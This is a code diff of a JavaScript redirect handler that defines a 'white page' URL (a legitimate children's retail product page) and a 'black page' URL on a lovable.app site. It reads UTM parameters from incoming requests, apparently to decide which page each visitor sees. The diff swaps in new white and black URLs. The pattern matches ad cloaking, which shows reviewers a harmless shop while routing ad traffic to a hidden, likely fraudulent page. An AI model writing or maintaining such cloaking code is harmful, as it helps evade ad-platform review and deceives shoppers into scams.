@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyshopstores.com/sa/en/Baby/Boys/Clothing/Multipacks/BABYSHOP-Love-Earth-Solid-Organic-Bodysuit-with-Round-Neck---Set-of-5/p/BA0409S21WHITEC-SHADE";
-    const blackPageURL = "https://casssshlov.lovable.app/?";
+    const whitePageURL = "https://www.firstcry.sa/en/fab-n-funky/playing-home-kitchen-set-interactive-cooking-pretend-play-set-for-kids-includes-mini-utensils-realistic-kitchen-toys-perfect-gift-toy-for-imaginative-play-105x32x104cm-ages-3-pink/12081342/product-detail";
+    const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
